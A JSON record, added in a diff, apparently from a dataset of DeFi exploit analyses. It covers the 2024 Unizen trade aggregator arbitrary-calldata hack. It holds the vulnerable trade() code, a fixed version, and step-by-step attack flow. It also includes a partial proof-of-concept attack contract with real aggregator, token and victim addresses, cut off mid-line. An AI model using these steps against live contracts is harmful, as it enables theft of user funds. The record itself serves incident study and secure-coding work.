@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-03-XX_UnizenIO_ArbitraryCalldata",
+ "source_file": "2024/2024-03-XX_UnizenIO_ArbitraryCalldata.md",
+ "title": "UnizenIO — Trade Aggregator Arbitrary Calldata Execution Vulnerability Analysis",
+ "date": "2024-03-01",
+ "protocol": "Unizen Trade Aggregator",
+ "chain": "Ethereum",
+ "loss_raw": "~$2,000,000",
+ "loss_usd": 2000000.0,
+ "root_cause": "The selector `0x1ef29a02` function in the trade aggregator proxy executes arbitrary target + calldata within a Call struct, exploiting victim's DMTR token approval to execute `transferFrom`",
+ "attack_tx": null,
+ "vulnerable_contract": "TradeAggregator 0xd3f64BAa",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: executes arbitrary target + calldata from Call struct\nstruct Info {\n    address recipient;\n    address token;\n    uint256 amount;\n    bytes32 uuid;\n    uint256 apiId;\n    uint256 fee;\n}\n\nstruct Call {\n    address target;   // ← arbitrary address\n    uint256 value;\n    bytes callData;   // ← arbitrary calldata (including transferFrom)\n}\n\n// Selector 0x1ef29a02\nfunction trade(Info memory info, Call[] memory calls) external payable {\n    for (uint i = 0; i < calls.length; i++) {\n        // No validation that target is an allowed address\n        // No validation that callData is not transferFrom\n        (bool success,) = calls[i].target.call{value: calls[i].value}(calls[i].callData);\n        require(success);\n    }\n}\n\n//",
+  "// File: Ownable.sol\n    function transferExecutorship(address newExecutor) public virtual onlyExecutor {  // ❌ Vulnerability\n        _pendingExecutor = newExecutor;\n        emit ExecutorshipTransferStarted(executor(), newExecutor);\n    }",
+  "// File: TransferHelper.sol\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));  // ❌ Vulnerability\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n    }\n\n    function safeTransfer(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_TOKEN_FAILED');\n    }\n\n    function safeTransferWithoutRequire(address token, address to, uint256 value) internal returns (bool) {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        return (success && (data.length == 0 || abi.decode(data, (bool))));\n    }\n\n    function safeTransferFrom(address token, address from, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');\n    }\n\n    function safeTransferETH(address to, uint value) internal {\n        // solium-disable-next-line\n        (bool success,) = to.call{value:value}(new bytes(0));\n        require(success, 'TransferHelper: TRANSFER_FAILED');\n    }\n\n    function safeDeposit(address wrapped, uint value) internal {\n        // bytes4(keccak256(bytes('deposit()')));\n        (bool success, bytes memory data) = wrapped.call{value:value}(abi.encodeWithSelector(0xd0e30db0));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: DEPOSIT_FAILED');\n    }\n\n    function safeWithdraw(address wrapped, uint value) internal {\n        // bytes4(keccak256(bytes('withdraw(uint256 wad)')));\n        (bool success, bytes memory data) = wrapped.call{value:0}(abi.encodeWithSelector(0x2e1a7d4d, value));"
+ ],
+ "code_after": [
+  "✅ Safe code: Call target whitelist + transferFrom selector blocking\nmapping(address => bool) public allowedTargets;\n\nfunction trade(Info memory info, Call[] memory calls) external payable {\n    for (uint i = 0; i < calls.length; i++) {\n        require(allowedTargets[calls[i].target], \"target not allowed\");\n        bytes4 selector = bytes4(calls[i].callData);\n        require(selector != IERC20.transferFrom.selector, \"transferFrom not allowed\");\n        (bool success,) = calls[i].target.call{value: calls[i].value}(calls[i].callData);\n        require(success);\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Query victim address and DMTR balance",
+  "→ [2] Encode transferFrom calldata",
+  "→ [3] Construct Call struct",
+  "→ [4] Call trade(info, [call]) (selector 0x1ef29a02)",
+  "→ [5] Victim's DMTR transferred → to aggregator",
+  "→ [6] ~$2M worth of DMTR drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Query victim address and DMTR balance\n  │         └─ victim = 0x7feAeE60..., balance = ~2.5T DMTR\n  │\n  ├─→ [2] Encode transferFrom calldata\n  │         └─ 0x23b872dd(victim, aggregator, balance)\n  │\n  ├─→ [3] Construct Call struct\n  │         └─ target = DMTR, callData = transferFrom(...)\n  │\n  ├─→ [4] Call trade(info, [call]) (selector 0x1ef29a02)\n  │         └─ Executes DMTR.transferFrom without validation\n  │\n  ├─→ [5] Victim's DMTR transferred → to aggregator\n  │\n  └─→ [6] ~$2M worth of DMTR drained",
+  "interface ITradeAggregator {\n    struct Info {\n        address recipient;\n        address token;\n        uint256 amount;\n        bytes32 uuid;\n        uint256 apiId;\n        uint256 fee;\n    }\n\n    struct Call {\n        address target;\n        uint256 value;\n        bytes callData;\n    }\n\n    // Selector 0x1ef29a02\n    function trade(Info memory info, Call[] memory calls) external payable;\n}\n\ncontract AttackContract {\n    ITradeAggregator constant aggregator = ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);\n    IERC20           constant DMTR       = IERC20(0x51cB253744189f11241becb29BeDd3F1b5384fdB);\n    address          constant victim     = 0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a;\n\n    function testExploit() external {\n        uint256 victimBalance = DMTR.balanceOf(victi"
+ ]
+}
